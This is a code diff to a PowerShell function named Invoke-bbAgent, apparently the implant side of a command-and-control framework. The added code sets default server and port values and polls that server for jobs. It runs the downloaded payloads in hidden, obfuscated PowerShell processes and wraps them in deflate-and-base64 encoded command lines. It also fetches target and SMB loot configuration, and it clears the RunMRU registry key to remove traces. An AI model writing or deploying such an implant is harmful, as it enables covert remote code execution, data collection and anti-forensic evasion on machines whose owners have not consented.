@@ -4,11 +4,11 @@ function Invoke-bbAgent
     Param
     (
         # IP to job server
-        [Parameter(Mandatory=$true, Position=0)]
-        [string]$ServerIP,
+        [Parameter(Position=0)]
+        [string]$ServerIP = "172.16.64.1",
         #Port of job server
-        [Parameter(Mandatory=$true, Position=1)]
-        [int]$Port
+        [Parameter(Position=1)]
+        [int]$Port = 1337
     )
     
     #Initialize Global webclient 2.0 compatible.
@@ -18,6 +18,8 @@ function Invoke-bbAgent
     $baseserver = "http://" + $ServerIP + ":" + $Port + "/"
     $jobURL = $baseserver + "getJob1"
     $dataURL = $baseserver + "pushData"
+    $configURL = $baseserver + "getConfig"
+    $addJobURL = $baseserver + "addJob"
 
     #Helper Functions
     ##################
@@ -103,6 +105,156 @@ function Invoke-bbAgent
         return (New-Object IO.StreamReader($uncompressedBytes,[Text.Encoding]::ASCII)).ReadToEnd()
     }
 
+    function Out-EncodedCommand
+    {
+        [CmdletBinding( DefaultParameterSetName = 'FilePath')]
+        Param (
+            [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
+            [ValidateNotNullOrEmpty()]
+            [ScriptBlock]
+            $ScriptBlock,
+
+            [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
+            [ValidateNotNullOrEmpty()]
+            [String]
+            $Path,
+
+            [Switch]
+            $EncodedOutput
+        )
+
+        if ($PSBoundParameters['Path'])
+        {
+            Get-ChildItem $Path -ErrorAction Stop | Out-Null
+            $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
+        }
+        else
+        {
+            $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
+        }
+
+        $CompressedStream = New-Object IO.MemoryStream
+        $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+        $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+        $DeflateStream.Dispose()
+        $CompressedScriptBytes = $CompressedStream.ToArray()
+        $CompressedStream.Dispose()
+        $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+
+        # Generate the code that will decompress and execute the payload.
+        # This code is intentionally ugly to save space.
+        $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
+
+        $CmdMaxLength = 8190
+
+        # Build up the full command-line string. Default to outputting a fully base-64 encoded command.
+        # If the fully base-64 encoded output exceeds the cmd.exe character limit, fall back to partial
+        $CommandlineOptions = New-Object String[](0)
+        $CommandlineOptions += '-NoE'
+        $CommandlineOptions += '-NoP'
+        $CommandlineOptions += '-NonI'
+        $CommandlineOptions += "-W Hidden"
+        
+        $CommandLineOutput = @{}
+        $CommandLineOutput["payload"] = "$($CommandlineOptions -join ' ') -C `"$NewScript`""
+
+        if ($PSBoundParameters['EncodedOutput'] -or $CommandLineOutput["payload"].Length -le $CmdMaxLength)
+        {
+            $UnicodeEncoder = New-Object System.Text.UnicodeEncoding        
+            $CommandLineOutput["Encoded"] = $true
+            $CommandLineOutput["payload"] = "$($CommandlineOptions -join ' ') -Enc `"$([Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript)))`""
+        }
+
+        if (($CommandLineOutput["payload"].Length -gt $CmdMaxLength) -and (-not $PSBoundParameters['EncodedOutput']))
+        {        
+            $CommandLineOutput["Encoded"] = $false        
+        }
+
+
+        Write-Output $CommandLineOutput
+    }
+
+    function Get-BBConfig
+    {
+        [CmdletBinding()]
+        Param()
+        $serverconfig = ConvertFrom-Json20 -item $($webc.DownloadString($configURL))
+        $confstring = @"
+`$Script:BB_IP = "$ServerIP"
+`$Script:BB_PORT = $([int]$Port)
+`$Script:BB_SMBLOOT = "$($serverconfig.BB_SMBLOOT)"
+`$Script:BB_SMBROOT = "$($serverconfig.BB_SMBROOT)"
+`$Script:BB_TARGET_HOSTNAME = "$($serverconfig.TARGET_HOSTNAME)"
+`$Script:BB_ADDJOBURL = "$addJobURL"
+"@
+        $newjobsb = {
+            function Send-NewJob
+            {
+                [CmdletBinding()]
+                Param(
+                    [Parameter(Mandatory=$true, Position=0)]
+                    [string]$jobName,
+                    [Parameter(Mandatory=$true, Position=1)]
+                    [string]$command,
+                    [Parameter(Mandatory=$true, Position=2)]
+                    [ValidateSet("process", "thread")]
+                    [string]$runType,
+                    [Parameter(Mandatory=$true, Position=3)]
+                    [string]$scriptName,
+                    [Parameter(Mandatory=$false, Position=4)]
+                    [string]$addjoburl = $BB_ADDJOBURL
+                )
+                add-type -assembly system.web.extensions
+                $webc = New-Object System.Net.WebClient
+
+                function ConvertTo-Json20
+                {
+                    [CmdletBinding()]
+                    Param(
+                        [Parameter(Mandatory=$true)]
+                        [psobject]$item
+                    )
+                    Write-Verbose "Converting object to JSON."
+                    $ps_js=new-object system.web.script.serialization.javascriptSerializer
+                    return $ps_js.Serialize($item)
+                }
+
+                function Send-BBData
+                {
+                    [CmdletBinding()]
+                    Param(
+                        [Parameter(Mandatory=$true, Position=0)]
+                        [string]$bbURL,
+                        [Parameter(Mandatory=$true, Position=1)]
+                        [hashtable]$jsonData
+                    )
+
+                    $jsonJob = ConvertTo-Json20 -item $jsonData
+                    $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
+                    try
+                    {
+                        $null = $webc.UploadString($bbURL, "POST", $jsonJob)
+                        return $true
+                    }
+                    catch
+                    {
+                        return $false
+                    }
+                }
+                #Main Part
+                $jobData = @{
+                    jobName = $jobName
+                    command = $command
+                    runType = $runType
+                    scriptName = $scriptName
+                }
+                return (Send-BBData $addjoburl $jobData)    
+            }
+        }
+        $confstring += "`r`n`r`n{0}" -f ($newjobsb.ToString())
+        return ([scriptblock]::Create($confstring))
+    }
+
     function Send-ReturnData
     {
         [CmdletBinding()]
@@ -139,12 +291,21 @@ function Invoke-bbAgent
             Write-Verbose "Testing to see if server machine is online."
             if(Test-Connection -ComputerName $ServerIP -Count 1 -Quiet)
             {
+                if([string]::IsNullOrEmpty($BBConfig))
+                {
+                    Write-Verbose "Reading BBConfig"
+                    $BBConfig = Get-BBConfig
+                }
+                else
+                {
+                    Write-Verbose "BBConfig already acquired, skipping reading."
+                }
                 Write-Verbose "Checking for finished jobs."
-                $doneJobs = Get-Job | where {@("Completed","Blocked","Failed") -contains $_.State}
+                $doneJobs = Get-Job | Where-Object {@("Completed","Blocked","Failed") -contains $_.State}
                 if($doneJobs)
                 {
                     Write-Verbose "Jobs were found, processing."
-                    $doneJobs | where {$_.state -eq "Completed"} | foreach {
+                    $doneJobs | Where-Object {$_.state -eq "Completed"} | ForEach-Object {
                         Write-Verbose ("Completed jobs are: {0}" -f ($_ | out-string))
                         if($_.HasMoreData)
                         {
@@ -172,7 +333,7 @@ function Invoke-bbAgent
                             }                            
                         }
                     }
-                    $doneJobs | where {@("Blocked","Failed") -contains $_.State} | foreach {
+                    $doneJobs | Where-Object {@("Blocked","Failed") -contains $_.State} | ForEach-Object {
                         Write-Verbose ("Blocked and Failed Jobs are: {0}" -f ($_ | out-string))
                         $jobData = "Job was terminated because it failed or was in block state for user input.`r`n"
                         if($_.HasMoreData)
@@ -218,21 +379,57 @@ function Invoke-bbAgent
                         $payloadobj.payload = ConvertFrom-CompressedEncoded -CompressedScript $($payloadobj.payload)
                     }
                     
-                    Write-Verbose "Appending command to script."
-                    $payloadobj.payload += $payloadobj.command
+                    
+                    if(-not [string]::IsNullOrEmpty($payloadobj.payload))
+                    {
+                        Write-Verbose "Appending command to script."
+                        $payloadobj.payload += $payloadobj.command
+                    }
+                    else
+                    {
+                        Write-Verbose "Command is empty, not appending"
+                    }
+                    Write-Verbose $payloadobj.payload
                     Write-Verbose ("Checking for runType which is: {0}" -f $payloadobj.runType)
                     if($payloadobj.runType -eq "process")
                     {
-                        Write-Verbose "Running job as process."
-                        $paydirt = ConvertTo-Base64 -Payload $payloadobj.payload -Encoding "unicode"
-                        $null = Start-Process "Powershell" -WindowStyle "Hidden" -ArgumentList "-NonI -NoP -W Hidden -ENC $paydirt"
+                        Write-Verbose "Running job as process."                        
+                        if($payloadobj.payload.Length -lt 400)
+                        {
+                            $paydirt = ConvertTo-Base64 -Payload $payloadobj.payload -Encoding "unicode"
+                            $paydirt = "-NonI -NoP -W Hidden -ENC $paydirt"
+                        }
+                        else
+                        {
+                            $paydirt = (Out-EncodedCommand -ScriptBlock ([scriptblock]::Create($payloadobj.payload))).payload
+                        }
+                        try {
+                            Write-Verbose $paydirt
+                            $processObj = Start-Process "Powershell" -WindowStyle "Hidden" -ArgumentList $paydirt -PassThru
+                            Remove-Variable -Name "paydirt"
+                            $retProc = @{
+                                jobName = $payloadobj.jobName
+                                data = "Job started under process {0}" -f ($processObj.Id)
+                            }
+                        }
+                        catch {
+                            Remove-Variable -Name "paydirt"
+                            $retProc = @{
+                                jobName = $payloadobj.jobName
+                                data = $_.Exception.Message
+                            }
+                        }
+                        if(Send-ReturnData -ReturnData $retProc)
+                        {
+                            Write-Verbose "Returned successful process data."
+                        }                        
                     }
                     else
                     {
                         Write-Verbose "Creating scriptblock from payload."
                         $payload = [scriptblock]::Create(($payloadobj.payload))
                         Write-Verbose "Starting job from payload."
-                        $null = Start-Job -Name $($payloadobj.jobName) -ScriptBlock $payload
+                        $null = Start-Job -Name $($payloadobj.jobName) -ScriptBlock $payload -InitializationScript ($BBConfig)
                     }
                     
                 }
@@ -253,7 +450,9 @@ function Invoke-bbAgent
                 $emptycount++
             }
             Write-Verbose "Sleeping for 1 seconds."
-            sleep -Seconds 1
+            Write-Verbose ("Count is at: {0}" -f $emptycount)
+            Write-Verbose (Get-Job | Out-String)
+            Start-Sleep -Seconds 1
         }
         Write-Verbose "Sending server quit command."
         try
@@ -267,5 +466,6 @@ function Invoke-bbAgent
     }
     Start-JobCycle
     Write-Verbose "Garbage collecting before exiting."
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
     [System.GC]::Collect()
 }
